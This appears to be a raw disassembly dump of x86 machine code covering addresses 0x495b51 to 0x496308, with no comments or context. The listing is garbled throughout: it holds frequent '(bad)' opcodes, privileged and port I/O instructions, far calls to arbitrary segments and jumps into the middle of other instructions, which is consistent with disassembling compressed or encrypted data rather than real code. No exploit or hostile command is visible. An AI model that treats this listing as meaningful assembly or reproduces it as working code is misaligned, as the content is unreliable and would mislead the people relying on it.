  495b51:	add    al,0xff
  495b53:	mov    bl,0x18
  495b56:	pop    eax
  495b57:	and    eax,0x5a2f7671
  495b5c:	mov    al,ds:0x567f7615
  495b61:	pop    es
  495b62:	bound  esi,QWORD PTR [ecx]
  495b64:	mov    ch,0xd1
  495b66:	mov    bh,0xa7
  495b68:	or     eax,0x7e0ad88
  495b6d:	aas    
  495b6e:	pop    es
  495b6f:	lds    eax,FWORD PTR [edx-0x8d0dfab]
  495b75:	mul    DWORD PTR [eax]
  495b77:	adc    eax,DWORD PTR [esp+eax*8-0x71db7e01]
  495b7e:	push   cs
  495b7f:	push   ss
  495b80:	dec    BYTE PTR [ecx]
  495b82:	jbe    0x495b47
  495b84:	push   ss
  495b85:	dec    eax
  495b86:	dec    edi
  495b87:	lods   al,BYTE PTR ds:[esi]
  495b88:	push   edi
  495b89:	out    dx,al
  495b8a:	pop    edi
  495b8b:	pop    edx
  495b8c:	and    BYTE PTR [ebp+0x67beb71c],bl
  495b92:	ins    BYTE PTR es:[edi],dx
  495b93:	xor    esi,DWORD PTR [ecx+0x7074f40]
  495b99:	xor    DWORD PTR [esi+ebp*2+0x50],0xa1c706c7
  495ba1:	push   ebp
  495ba2:	add    BYTE PTR [eax+0x37],bl
  495ba5:	adc    BYTE PTR [eax+0x47e66206],dh
  495bab:	cmp    al,0xcf
  495bad:	pop    ds
  495bae:	in     al,dx
  495baf:	jg     0x495bb0
  495bb1:	push   esp
  495bb2:	push   esp
  495bb3:	push   esp
  495bb4:	jg     0x495bed
  495bb6:	sbb    eax,0x902eb668
  495bbb:	pop    es
  495bbc:	add    eax,DWORD PTR [eax]
  495bbe:	add    eax,0x2b0b1b6
  495bc3:	jmp    0xd7d8d335
  495bc8:	sbb    BYTE PTR [esi],dl
  495bca:	or     eax,ebx
  495bcc:	emms   
  495bce:	pop    ds
  495bcf:	sbb    BYTE PTR ss:[ebp-0x3d],ch
  495bd3:	daa    
  495bd4:	pop    es
  495bd5:	inc    esi
  495bd6:	pop    es
  495bd7:	fidiv  WORD PTR [esi-0x30687f26]
  495bdd:	pop    es
  495bde:	add    al,0x60
  495be0:	test   esp,esi
  495be2:	out    dx,eax
  495be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495be4:	sbb    ch,ch
  495be6:	mov    ah,0xd6
  495be8:	(bad)  
  495be9:	outs   dx,DWORD PTR ds:[esi]
  495bea:	add    ah,BYTE PTR es:[ebx-0x4f83c43]
  495bf1:	inc    ecx
  495bf2:	add    BYTE PTR [ebp-0x2],ch
  495bf5:	fnstcw WORD PTR [edx-0x54]
  495bf8:	xchg   edx,eax
  495bf9:	xor    DWORD PTR [edi],eax
  495bfb:	call   0x6ab7:0x9d66500
  495c02:	mov    ds:0x85a767f9,al
  495c07:	xor    al,0xf9
  495c09:	sub    ah,BYTE PTR [edi-0x19]
  495c0c:	out    0xe7,eax
  495c0e:	jmp    FWORD PTR [eax+0x76d460d]
  495c14:	dec    esi
  495c15:	pop    es
  495c16:	mov    cl,0x85
  495c18:	test   edx,ebx
  495c1a:	xchg   edi,ebx
  495c1c:	push   DWORD PTR [eax+0x572360e2]
  495c22:	aaa    
  495c23:	out    dx,eax
  495c24:	int    0x76
  495c26:	xchg   DWORD PTR [ecx-0x9],esi
  495c29:	xchg   DWORD PTR [eax+eax*1+0x2e4309dd],edi
  495c30:	and    BYTE PTR [eax+0x4f27009a],dl
  495c36:	outs   dx,DWORD PTR ds:[esi]
  495c37:	je     0x495c60
  495c39:	mov    ds:0xc01d00d9,eax
  495c3e:	mov    ch,0x7e
  495c40:	push   es
  495c41:	mov    ecx,DWORD PTR [eax+0x275f8710]
  495c47:	inc    eax
  495c48:	in     al,dx
  495c49:	pusha  
  495c4a:	jae    0x495c3b
  495c4c:	pop    es
  495c4d:	sysret 
  495c4f:	test   BYTE PTR [esi],cl
  495c51:	imul   ebp,DWORD PTR ds:0xd0adc7c7,0x37261838
  495c5b:	jmp    FWORD PTR [esi+0x2607b668]
  495c61:	rol    DWORD PTR [eax],1
  495c63:	out    dx,eax
  495c64:	js     0x495be9
  495c66:	neg    DWORD PTR ds:0x34e0a76c
  495c6c:	pop    es
  495c6d:	pop    es
  495c6e:	sub    eax,0x16b61b00
  495c73:	sbb    DWORD PTR [edi-0x18335e27],ebp
  495c79:	xchg   esi,eax
  495c7a:	std    
  495c7b:	ja     0x495c69
  495c7d:	xor    BYTE PTR [eax-0x65],ah
  495c80:	das    
  495c81:	pop    es
  495c82:	inc    esi
  495c83:	pop    es
  495c84:	or     eax,DWORD PTR [edx+0x6c]
  495c87:	push   eax
  495c88:	out    dx,eax
  495c89:	das    
  495c8a:	fwait
  495c8b:	int    0x76
  495c8d:	adc    al,0xe7
  495c8f:	rol    BYTE PTR [eax],cl
  495c91:	test   ebx,0x3716ed7
  495c97:	push   ebp
  495c98:	push   edx
  495c99:	push   0x1ff63134
  495c9e:	mov    bx,0xa488
  495ca2:	push   edi
  495ca3:	add    BYTE PTR ss:[ecx],bl
  495ca6:	jge    0x495c84
  495ca8:	xor    eax,0x8a41cd9b
  495cad:	outs   dx,DWORD PTR ds:[esi]
  495cae:	xchg   BYTE PTR [ebx-0x7d],bh
  495cb1:	jge    0x495cba
  495cb3:	test   BYTE PTR [esp+eax*4-0x7fbe7c4b],al
  495cba:	das    
  495cbb:	pop    es
  495cbc:	scas   al,BYTE PTR es:[edi]
  495cbd:	push   0x79db36
  495cc2:	addr16 inc edi
  495cc4:	inc    ecx
  495cc5:	add    ah,BYTE PTR ds:0x2c300fef
  495ccb:	loop   0x495c4d
  495ccd:	sysret 
  495ccf:	and    ah,ah
  495cd1:	popf   
  495cd2:	mov    esp,0x6130b7e
  495cd7:	pop    ss
  495cd8:	call   0xbdf:0x15aeaba4
  495cdf:	dec    edi
  495ce0:	ss push ecx
  495ce2:	dec    ecx
  495ce3:	sub    ebx,edi
  495ce5:	or     DWORD PTR [edi],eax
  495ce7:	leave  
  495ce8:	and    eax,0x843f202d
  495ced:	or     BYTE PTR [eax-0x35],ch
  495cf0:	pop    es
  495cf1:	add    BYTE PTR [edx],al
  495cf3:	test   al,0x40
  495cf5:	and    eax,0xd7515001
  495cfa:	dec    ebx
  495cfb:	mov    eax,ds:0x42902a00
  495d00:	add    DWORD PTR [eax+eiz*1-0x7c],edx
  495d04:	add    ch,BYTE PTR [eax+0x50050940]
  495d0a:	adc    DWORD PTR [edx],0x2402a00a
  495d10:	adc    al,0x40
  495d12:	add    eax,0xa802848
  495d17:	nop
  495d18:	push   eax
  495d19:	add    BYTE PTR ds:0x2a00a120,dl
  495d1f:	inc    eax
  495d20:	inc    edx
  495d21:	add    DWORD PTR [ecx+eax*4-0x7c],edx
  495d25:	add    ch,BYTE PTR [eax+0x50050900]
  495d2b:	add    al,0x3e
  495d2d:	sub    BYTE PTR [eax],cl
  495d2f:	or     al,BYTE PTR [eax]
  495d31:	push   ebx
  495d32:	add    esp,eax
  495d34:	je     0x495cc0
  495d36:	fwait
  495d37:	and    BYTE PTR [edi+0x79],dh
  495d3a:	(bad)  
  495d3b:	xor    eax,0xe1a61d4
  495d40:	add    BYTE PTR [ebx],dh
  495d42:	add    BYTE PTR [esp+eax*2+0x6b],al
  495d46:	adc    dl,BYTE PTR [edi+0x4a6b8122]
  495d4c:	push   0x5d73f16
  495d51:	pop    ecx
  495d52:	mov    bh,0x8
  495d54:	cmp    ecx,DWORD PTR [esi+ebx*2+0x67]
  495d58:	adc    ch,BYTE PTR cs:[eax+0x5c748506]
  495d5f:	push   edi
  495d60:	out    dx,eax
  495d61:	int    0x52
  495d63:	sub    DWORD PTR [edi-0x75],edi
  495d66:	arpl   WORD PTR [esi+0x67],bp
  495d69:	mov    bl,0x4
  495d6b:	faddp  st(5),st
  495d6d:	mov    esi,0x470c3375
  495d72:	inc    esi
  495d73:	ss popa 
  495d75:	faddp  st(5),st
  495d77:	cmp    cl,BYTE PTR [ebx+0x54330b07]
  495d7d:	es js  0x495dd7
  495d80:	jo     0x495d5c
  495d82:	std    
  495d83:	stos   BYTE PTR es:[edi],al
  495d84:	sbb    al,BYTE PTR [eax]
  495d86:	dec    esi
  495d87:	and    bl,BYTE PTR [esi]
  495d89:	push   0xda127036
  495d8e:	mov    ebp,0x796b9ef7
  495d93:	inc    esi
  495d94:	outs   dx,DWORD PTR ds:[esi]
  495d95:	jbe    0x495dfb
  495d97:	push   ds
  495d98:	jae    0x495dc4
  495d9a:	and    ah,BYTE PTR [ebx-0x2b]
  495d9d:	sub    BYTE PTR [edi+esi*8+0x6506667a],bh
  495da4:	es (bad) cs:[ebp+0x10306048]
  495dac:	ds jecxz 0x495dd2
  495daf:	cmp    BYTE PTR [ecx],ch
  495db1:	sbb    BYTE PTR [esi-0x4e6093b8],cl
  495db7:	and    DWORD PTR [eax-0x4f],0xbfb430d
  495dbe:	aaa    
  495dbf:	mov    esp,0x5b60b077
  495dc4:	mov    esi,0x32704643
  495dc9:	imul   ebx,edx,0x785c3b5
  495dcf:	pop    edx
  495dd0:	adc    ah,BYTE PTR [esi+0x3a]
  495dd3:	outs   dx,BYTE PTR ds:[esi]
  495dd4:	ins    BYTE PTR es:[edi],dx
  495dd5:	sub    BYTE PTR [ebx+0xf],0x7e
  495dd9:	or     DWORD PTR [eax],eax
  495ddb:	inc    edi
  495ddc:	idiv   DWORD PTR [ecx+0x47]
  495ddf:	adc    al,0xb
  495de1:	stos   DWORD PTR es:[edi],eax
  495de2:	dec    ebp
  495de3:	xor    BYTE PTR [edi+ecx*4-0x1f08acf2],ch
  495dea:	out    dx,al
  495deb:	imul   ecx,DWORD PTR [edi+0x4a49000f],0x2a760f6a
  495df5:	pop    eax
  495df6:	in     eax,dx
  495df7:	fnsave [eax-0x76]
  495dfa:	pop    edi
  495dfb:	or     dl,BYTE PTR gs:[eax]
  495dfe:	aas    
  495dff:	rol    BYTE PTR [esi+0x6d],1
  495e02:	and    ch,BYTE PTR [edi+0x15]
  495e05:	inc    ebx
  495e06:	fld    TBYTE PTR [ebp+0x66dc104d]
  495e0c:	sub    dl,BYTE PTR [edi+0x9]
  495e0f:	aas    
  495e10:	sbb    eax,0x67a60490
  495e15:	dec    ebp
  495e16:	out    dx,eax
  495e17:	jb     0x495e36
  495e19:	fisttp DWORD PTR [eax+0x4133f67]
  495e1f:	jle    0x495e5d
  495e21:	aam    0xee
  495e23:	outs   dx,BYTE PTR ds:[esi]
  495e24:	sbb    al,BYTE PTR [ecx]
  495e26:	add    eax,DWORD PTR [eax]
  495e28:	push   edx
  495e29:	(bad)  
  495e2b:	loop   0x495df4
  495e2d:	cmp    eax,0x6bb3b8e
  495e32:	add    BYTE PTR [ecx+0x7f],bl
  495e35:	ins    BYTE PTR es:[edi],dx
  495e36:	lock cs fdivrp st(3),st
  495e3a:	jnp    0x495e40
  495e3c:	ins    BYTE PTR es:[edi],dx
  495e3d:	mov    dh,0x65
  495e3f:	sub    al,BYTE PTR [esi+0xe]
  495e42:	arpl   WORD PTR [ecx+0x3b],dx
  495e45:	mov    edi,0x52737ef7
  495e4a:	popa   
  495e4b:	xor    al,BYTE PTR [ecx+0x0]
  495e4e:	jno    0x495e62
  495e50:	add    eax,0x8f6c581e
  495e55:	fisubr WORD PTR [eax+0x26]
  495e58:	je     0x495e91
  495e5a:	dec    ebp
  495e5b:	repz pop edx
  495e5d:	idiv   BYTE PTR [esi]
  495e5f:	push   ds
  495e60:	mov    esp,0x83b656f
  495e65:	imul   esp,DWORD PTR es:[edi],0xffffff9f
  495e69:	pop    es
  495e6a:	addr16 hlt 
  495e6c:	fisubr WORD PTR [edx+0x43]
  495e6f:	cmp    esp,DWORD PTR [edi+0x6b8a0b6a]
  495e75:	mov    cl,0xbd
  495e77:	imul   esi,DWORD PTR [edx],0xddf6f6d
  495e7d:	(bad)  
  495e7e:	xor    ebx,DWORD PTR [ebx]
  495e80:	test   al,0xb8
  495e82:	and    DWORD PTR [esi],ecx
  495e84:	sub    eax,DWORD PTR ss:[ecx+0x1a]
  495e88:	out    dx,eax
  495e89:	sub    bl,dl
  495e8b:	lds    esi,FWORD PTR [eax-0x19]
  495e8e:	dec    edx
  495e8f:	popa   
  495e90:	pop    ss
  495e91:	push   edi
  495e92:	xchg   eax,eax
  495e94:	ror    dh,1
  495e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495e97:	imul   edx,DWORD PTR [edi],0x61
  495e9a:	jbe    0x495ea6
  495e9c:	scas   eax,DWORD PTR es:[edi]
  495e9d:	aad    0xb6
  495e9f:	mov    eax,ds:0x5b466f68
  495ea4:	add    esi,ebx
  495ea6:	sub    edi,0x3d
  495ea9:	and    eax,0x728e4500
  495eae:	iret   
  495eaf:	and    bh,al
  495eb1:	ins    DWORD PTR es:[edi],dx
  495eb2:	push   ss
  495eb3:	jbe    0x495e53
  495eb5:	out    dx,eax
  495eb6:	jnp    0x495e67
  495eb8:	addr16 and ah,BYTE PTR [bp+di-0x5d]
  495ebd:	je     0x495f02
  495ebf:	ins    BYTE PTR es:[edi],dx
  495ec0:	xchg   WORD PTR [ecx+0x6d13f9d3],ax
  495ec7:	arpl   WORD PTR [esi],cx
  495ec9:	jb     0x495f03
  495ecb:	in     al,0xbd
  495ecd:	xchg   ebx,eax
  495ece:	je     0x495ee6
  495ed0:	push   ss
  495ed1:	sub    eax,0x107a4432
  495ed6:	sub    al,0xaf
  495ed8:	ins    DWORD PTR es:[edi],dx
  495ed9:	mov    edi,0x747e6e12
  495ede:	fcomp  DWORD PTR [bp+si-0x53]
  495ee2:	fcomp  DWORD PTR [ebx]
  495ee4:	pop    ebx
  495ee5:	and    esi,DWORD PTR [ebx+0x6b]
  495ee8:	fdivr  QWORD PTR ds:0x2207287a
  495eee:	add    BYTE PTR [ebp-0x79],dl
  495ef1:	bound  edx,QWORD PTR [esi]
  495ef3:	push   esi
  495ef4:	mov    dh,0x7c
  495ef6:	xlat   BYTE PTR ds:[ebx]
  495ef7:	sbb    eax,0x20cbaee7
  495efc:	add    BYTE PTR [ecx+0x3f],ah
  495eff:	in     eax,dx
  495f00:	popf   
  495f01:	mov    esp,0x86663a96
  495f06:	inc    ebx
  495f07:	or     esi,DWORD PTR gs:[esi+0x18297814]
  495f0e:	pop    ebp
  495f0f:	push   DWORD PTR [ebx]
  495f11:	pop    ss
  495f12:	push   0x1f7de4c1
  495f17:	and    eax,0xab0b2352
  495f1c:	js     0x495ed6
  495f1e:	mov    ebx,0x97322d6b
  495f23:	mov    esi,0xbe0e5baf
  495f28:	imul   ebx,DWORD PTR [ebx+0xe743769],0x2ed0aa6c
  495f32:	sahf   
  495f33:	pop    ebx
  495f34:	and    al,0x8f
  495f36:	je     0x495fa8
  495f38:	rol    DWORD PTR [esi+0x35bde262],cl
  495f3e:	ja     0x495f0f
  495f40:	cmp    esi,DWORD PTR [edi+0x22]
  495f43:	jns    0x495fbc
  495f45:	cmp    DWORD PTR [esi-0x6ce927f2],ecx
  495f4b:	add    eax,0x83510b2f
  495f50:	xchg   DWORD PTR [ebx+0x33611a06],esp
  495f56:	cmp    eax,DWORD PTR ds:0x4e0e9f8b
  495f5c:	pop    ebx
  495f5d:	dec    edx
  495f5e:	dec    edi
  495f5f:	xor    eax,edi
  495f61:	popa   
  495f62:	jp     0x495ef3
  495f64:	repz jnp 0x495f79
  495f67:	jns    0x495fc7
  495f69:	push   eax
  495f6a:	add    BYTE PTR [ebp-0x26],dh
  495f6d:	das    
  495f6e:	mov    ebp,0xab7d16e
  495f73:	mov    bl,0x4
  495f75:	pop    DWORD PTR [ebx+0x53]
  495f78:	push   0x6c
  495f7a:	out    0x37,eax
  495f7c:	aam    0xec
  495f7e:	outs   dx,DWORD PTR ds:[esi]
  495f7f:	and    al,BYTE PTR [ecx]
  495f81:	add    al,0x9e
  495f83:	add    BYTE PTR [di+0x7],dl
  495f87:	mov    eax,0x9a1378ba
  495f8c:	outs   dx,BYTE PTR ds:[esi]
  495f8d:	dec    esi
  495f8e:	inc    ebp
  495f8f:	fwait
  495f90:	cmp    al,ah
  495f92:	jnp    0x495f30
  495f94:	add    al,0x56
  495f96:	iret   
  495f97:	dec    esp
  495f98:	dec    edx
  495f99:	and    eax,DWORD PTR [eax-0x3f]
  495f9c:	cmp    ecx,DWORD PTR [edx+0x52365702]
  495fa2:	mov    edi,0x8fdf07b8
  495fa7:	add    al,0x3
  495fa9:	ja     0x49601a
  495fab:	dec    ecx
  495fac:	xlat   BYTE PTR ds:[ebx]
  495fad:	add    esp,DWORD PTR [edx]
  495faf:	stos   DWORD PTR es:[edi],eax
  495fb0:	outs   dx,DWORD PTR ds:[esi]
  495fb1:	jne    0x496023
  495fb3:	push   ss
  495fb4:	adc    edx,DWORD PTR [esi+0x6f]
  495fb7:	sub    eax,DWORD PTR [edi]
  495fb9:	repz mov ebp,0x2e068f7a
  495fbf:	sub    ebx,DWORD PTR [edi-0x2edfd494]
  495fc5:	sar    DWORD PTR [ebx-0x7d],cl
  495fc8:	retf   0x62a6
  495fcb:	mov    ah,BYTE PTR [ecx-0x1d]
  495fce:	aaa    
  495fcf:	sahf   
  495fd0:	fidivr DWORD PTR [edx]
  495fd2:	fiadd  WORD PTR [edx+0x7516ef73]
  495fd8:	mov    DWORD PTR [eax+0x5b],0x1fae2df1
  495fdf:	dec    ecx
  495fe0:	lahf   
  495fe1:	cs das 
  495fe3:	fadd   st(3),st
  495fe5:	mov    ebp,DWORD PTR [ebx]
  495fe7:	daa    
  495fe8:	daa    
  495fe9:	jecxz  0x496012
  495feb:	jmp    0x496068
  495fed:	push   0x5f
  495fef:	push   edi
  495ff0:	sbb    eax,0x1f64ef32
  495ff5:	(bad)  
  495ff6:	gs in  eax,dx
  495ff8:	cmp    ecx,DWORD PTR [edx+0x73753363]
  495ffe:	bound  esi,QWORD PTR [edi]
  496000:	popa   
  496001:	xlat   BYTE PTR ds:[ebx]
  496002:	call   0x690d2767
  496007:	outs   dx,DWORD PTR ds:[esi]
  496008:	xchg   edx,edi
  49600a:	pop    ds
  49600b:	jge    0x496064
  49600d:	ror    DWORD PTR [ebp+0x6da35ac3],cl
  496013:	xchg   ebx,eax
  496014:	je     0x495f9a
  496016:	cmp    DWORD PTR [ecx],0x16
  496019:	jmp    0x495faa
  49601b:	popa   
  49601c:	jae    0x49602c
  49601e:	mov    eax,0x83f8aa
  496023:	pop    es
  496024:	es push cs
  496026:	xchg   DWORD PTR [ebx+0x26731f1f],ecx
  49602c:	retf   
  49602d:	add    dh,dh
  49602f:	dec    ebx
  496030:	jle    0x49604f
  496032:	out    dx,eax
  496033:	ret    
  496034:	add    DWORD PTR [ebx+0x2b],0x63
  496038:	fwait
  496039:	add    eax,0xe0c74836
  49603e:	sbb    eax,0x1606de1e
  496043:	inc    ecx
  496044:	arpl   WORD PTR [edx],bx
  496046:	sbb    eax,DWORD PTR [ebx-0x4dc7cf89]
  49604c:	es xchg edx,eax
  49604e:	pop    es
  49604f:	sbb    cl,BYTE PTR [ecx-0x3e]
  496052:	out    dx,eax
  496053:	(bad)  
  496054:	pop    ecx
  496055:	mov    esp,0x56773b6e
  49605a:	test   DWORD PTR [edx],0xedb026b6
  496060:	jbe    0x4960a6
  496062:	xchg   DWORD PTR [eax],esp
  496064:	sub    ecx,DWORD PTR [ebx]
  496066:	imul   DWORD PTR [ebx]
  496068:	mov    ebp,0x5bb60583
  49606d:	sbb    ah,dh
  49606f:	push   ebx
  496070:	fiadd  DWORD PTR [ebx]
  496072:	jmp    0x1f9f9e57
  496077:	cs dec esi
  496079:	arpl   WORD PTR [edx],dx
  49607b:	inc    ebp
  49607c:	add    eax,0x93bbb804
  496081:	jb     0x496099
  496083:	inc    edx
  496084:	pop    ebx
  496085:	push   esi
  496086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496087:	popa   
  496088:	aad    0x21
  49608a:	mov    esi,DWORD PTR [edi+0x5f]
  49608d:	ins    DWORD PTR es:[edi],dx
  49608e:	push   ebp
  49608f:	aaa    
  496090:	mov    edx,0xd772a363
  496095:	sbb    dh,BYTE PTR [edi+0x1d]
  496098:	sbb    esp,DWORD PTR [esi+0x271d0310]
  49609e:	das    
  49609f:	cmp    al,0x60
  4960a1:	ret    
  4960a2:	(bad)  
  4960a3:	mov    edi,0x4d72e764
  4960a8:	js     0x49607b
  4960aa:	jge    0x496108
  4960ac:	pop    edx
  4960ad:	dec    ecx
  4960ae:	stos   DWORD PTR es:[edi],eax
  4960af:	xor    ebp,DWORD PTR [ebx+eiz*2+0x46]
  4960b3:	cmp    eax,0x93aec5de
  4960b8:	sub    DWORD PTR [edi+0x63],esi
  4960bb:	jmp    0x4960d7
  4960bd:	ja     0x4960a2
  4960bf:	cli    
  4960c0:	icebp  
  4960c1:	jg     0x496119
  4960c3:	addr16 imul ebp,edi,0x43bb0ae6
  4960ca:	sbb    BYTE PTR [ebp-0x710474b1],bl
  4960d0:	daa    
  4960d1:	jl     0x49612f
  4960d3:	in     al,dx
  4960d4:	jbe    0x49611e
  4960d6:	out    dx,eax
  4960d7:	and    ah,BYTE PTR [edi+0x5b6b066d]
  4960dd:	shl    DWORD PTR [edx-0x79],0x76
  4960e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4960e2:	xchg   ebx,eax
  4960e3:	push   edi
  4960e4:	ins    BYTE PTR es:[edi],dx
  4960e5:	inc    ebp
  4960e6:	(bad)  
  4960e7:	fimul  DWORD PTR [esi]
  4960e9:	fs inc edi
  4960eb:	pop    ss
  4960ec:	xchg   DWORD PTR [ebx-0x40],eax
  4960ef:	add    ebp,DWORD PTR [edi-0x80]
  4960f2:	dec    edx
  4960f3:	fild   QWORD PTR [edx]
  4960f5:	pop    edx
  4960f6:	in     al,dx
  4960f7:	or     BYTE PTR [esi+0x7],ch
  4960fa:	jb     0x496157
  4960fc:	adc    ebx,DWORD PTR [edi-0x1e]
  4960ff:	pop    ebp
  496100:	hlt    
  496101:	xor    BYTE PTR [ebx-0x308bbcee],dl
  496107:	xchg   esp,eax
  496108:	jbe    0x4960f7
  49610a:	fisub  WORD PTR [edx]
  49610c:	scas   al,BYTE PTR es:[edi]
  49610d:	push   ebx
  49610e:	inc    esi
  49610f:	cli    
  496110:	sub    eax,0x618f5fd6
  496115:	or     edx,esi
  496117:	scas   eax,DWORD PTR es:[edi]
  496118:	retf   
  496119:	cmp    ebx,DWORD PTR [ebx]
  49611b:	sti    
  49611c:	loope  0x4960cb
  49611e:	fidivr WORD PTR [ecx-0x3904e1d1]
  496124:	mov    ds:0x5e9bb870,eax
  496129:	pop    edi
  49612a:	jb     0x4960d7
  49612c:	jbe    0x496134
  49612e:	mov    ebx,0x15d7eaf0
  496133:	dec    ebx
  496134:	inc    eax
  496135:	sti    
  496136:	outs   dx,DWORD PTR ds:[esi]
  496137:	inc    edi
  496138:	dec    ecx
  496139:	fwait
  49613a:	imul   ecx,DWORD PTR ds:0x37637f57,0xdc5f20fb
  496144:	lock mov al,0xe3
  496147:	jae    0x496128
  496149:	call   DWORD PTR [edi+0x70]
  49614c:	or     bl,dh
  49614e:	cmp    DWORD PTR [ebx+eiz*8+0x63],ebx
  496152:	mov    ?,WORD PTR [edi]
  496154:	addr16 add esi,esi
  496157:	data16 rcr BYTE PTR [ebx-0x1528d0d9],0x52
  49615f:	lea    ecx,[edx+0x6eefb735]
  496165:	fimul  DWORD PTR [esi+0x2e97aef3]
  49616b:	push   ss
  49616c:	dec    esi
  49616d:	dec    edi
  49616e:	xor    edi,DWORD PTR [eax]
  496170:	loopne 0x496150
  496172:	shr    DWORD PTR [edi-0x283d8999],0x88
  496179:	scas   eax,DWORD PTR es:[edi]
  49617a:	jecxz  0x49617b
  49617c:	ins    BYTE PTR es:[edi],dx
  49617d:	cmp    esp,edi
  49617f:	sub    al,BYTE PTR [eax+edx*4-0x46]
  496183:	dec    esi
  496184:	inc    edx
  496185:	(bad)  
  496187:	mov    ah,0xe5
  496189:	lds    ebp,FWORD PTR [esi-0x718bc0e9]
  49618f:	pushaw 
  496191:	and    bl,BYTE PTR [edx]
  496193:	mov    ebx,0x12cf2773
  496198:	or     bl,dh
  49619a:	mov    ecx,DWORD PTR [ebx+0x67df6483]
  4961a0:	addr16 dec edi
  4961a2:	test   DWORD PTR [ebx],ecx
  4961a4:	jo     0x49621f
  4961a6:	pop    es
  4961a7:	add    BYTE PTR [edi+0x6e],dl
  4961aa:	pop    DWORD PTR ds:0x530f6c42
  4961b0:	dec    DWORD PTR [ebx]
  4961b2:	pop    ds
  4961b3:	push   ebx
  4961b4:	lgs    esp,FWORD PTR [ebp-0x10f86593]
  4961bb:	xor    ch,BYTE PTR [ecx+0x1]
  4961be:	ja     0x496234
  4961c0:	push   cs
  4961c1:	or     al,0x1a
  4961c3:	adc    ah,BYTE PTR [ebx+0x6179ab70]
  4961c9:	push   ebp
  4961ca:	loopne 0x4961d5
  4961cc:	xchg   ebx,eax
  4961cd:	das    
  4961ce:	and    ebp,esi
  4961d0:	shl    ebx,0xf7
  4961d3:	mov    ds:0xcb0a537f,al
  4961d8:	sbb    BYTE PTR [ebx-0x2f],0x68
  4961dc:	xlat   BYTE PTR ds:[ebx]
  4961dd:	jb     0x49624e
  4961df:	dec    edx
  4961e0:	inc    edi
  4961e1:	or     DWORD PTR [ebx],eax
  4961e3:	idiv   DWORD PTR [edx]
  4961e5:	sbb    DWORD PTR [edx-0x75cec1d5],ebp
  4961eb:	inc    esi
  4961ec:	out    dx,eax
  4961ed:	iret   
  4961ee:	adc    esp,DWORD PTR [esi+0x7c0ad833]
  4961f4:	jmp    0x5fdb:0x17cb6cc7
  4961fb:	add    al,BYTE PTR [ebx-0x30def456]
  496201:	ss pop ebp
  496203:	js     0x4961fa
  496205:	ret    
  496206:	and    BYTE PTR [edi],ch
  496208:	jp     0x4961cd
  49620a:	popa   
  49620b:	mov    edi,0xd9886071
  496210:	rcr    DWORD PTR [edx+ecx*2],cl
  496213:	jmp    0x49625b
  496215:	adc    DWORD PTR [esi+0x20],edx
  496218:	call   FWORD PTR [edi+0x58]
  49621b:	aad    0xc1
  49621d:	sbb    ah,bh
  49621f:	pop    edx
  496220:	dec    edi
  496221:	imul   ebp,DWORD PTR [esi],0xfffffff7
  496224:	pop    eax
  496225:	pop    esp
  496226:	sbb    eax,ebx
  496228:	jae    0x49622a
  49622a:	outs   dx,DWORD PTR ds:[esi]
  49622b:	arpl   WORD PTR [edi+eax*1],cx
  49622e:	or     esi,eax
  496230:	pop    ss
  496231:	mov    ds:0xb1c7c77f,eax
  496236:	sbb    DWORD PTR [ebx],edx
  496238:	popa   
  496239:	inc    ebx
  49623a:	sub    esi,DWORD PTR [edi+0x48]
  49623d:	rol    ebp,0x15
  496240:	sti    
  496241:	adc    ah,bl
  496243:	repz mov ?,WORD PTR [esi+0x5]
  496247:	imul   edi,DWORD PTR [edi],0xffffffc3
  49624a:	adc    DWORD PTR [ebx+0x49],ecx
  49624d:	push   edi
  49624e:	in     eax,dx
  49624f:	mov    al,BYTE PTR [ebx+0x4c]
  496252:	jnp    0x49626b
  496254:	inc    edi
  496255:	and    BYTE PTR [ebp-0x73],bh
  496258:	jno    0x4962a7
  49625a:	fild   QWORD PTR [ecx]
  49625c:	inc    esi
  49625d:	pop    es
  49625e:	les    ebp,FWORD PTR [esi]
  496260:	sahf   
  496261:	jbe    0x49624a
  496263:	stos   DWORD PTR es:[edi],eax
  496264:	sti    
  496265:	jnp    0x496273
  496267:	(bad)  
  496268:	clc    
  496269:	jo     0x4962cf
  49626b:	aas    
  49626c:	popa   
  49626d:	or     esi,DWORD PTR [ebx-0x2a]
  496270:	mov    cl,0xda
  496272:	jne    0x4962db
  496274:	sub    BYTE PTR [edi+0x6ec5d38f],ah
  49627a:	aam    0xab
  49627c:	pop    esi
  49627d:	mov    ds:0xd813b24,eax
  496282:	jmp    0x4962de
  496284:	daa    
  496285:	jnp    0x49624b
  496287:	(bad)  
  496288:	xlat   BYTE PTR ds:[ebx]
  496289:	inc    ebp
  49628a:	pop    ds
  49628b:	jmp    FWORD PTR fs:[esi]
  49628e:	rol    BYTE PTR [ecx+0x6c],0xe8
  496292:	pop    edi
  496293:	sbb    edx,DWORD PTR [ebx+0x74458f63]
  496299:	cmp    edx,ecx
  49629b:	popa   
  49629c:	sub    edx,DWORD PTR [edi]
  49629e:	push   edx
  49629f:	xor    BYTE PTR [eax+0x5f],bh
  4962a2:	pop    edi
  4962a3:	mov    edi,0x78ee7df
  4962a8:	sbb    esi,DWORD PTR cs:[edx-0x16]
  4962ac:	(bad)  
  4962ae:	call   0x140:0xb50c547b
  4962b5:	adc    eax,0x51af4f9f
  4962ba:	jne    0x49632c
  4962bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4962bd:	cli    
  4962be:	sbb    edi,DWORD PTR ds:0x16b55b28
  4962c4:	push   edi
  4962c5:	cmp    edx,DWORD PTR [esi+0x140de91a]
  4962cb:	mov    ds:0x6b79035b,eax
  4962d0:	pop    esp
  4962d1:	lds    ebp,FWORD PTR [edx+0x63c323b0]
  4962d7:	arpl   WORD PTR [eax+0x67e17ef0],cx
  4962dd:	imul   esp,DWORD PTR [ebx-0x31],0xb8d4379e
  4962e4:	bound  edx,QWORD PTR [ebx+0x64288273]
  4962ea:	bound  esi,QWORD PTR [ebx+0x1dde3ec1]
  4962f0:	add    DWORD PTR [ebx+0x74],0x77
  4962f4:	pusha  
  4962f5:	and    esp,DWORD PTR [esi]
  4962f7:	lods   al,BYTE PTR ds:[esi]
  4962f8:	mov    edi,0xa2e83c77
  4962fd:	call   0xa2c0:0xc76d9f2b
  496304:	pop    ss
  496305:	inc    edi
  496306:	(bad)  
  496307:	daa    
  496308:	push   0x378fb463
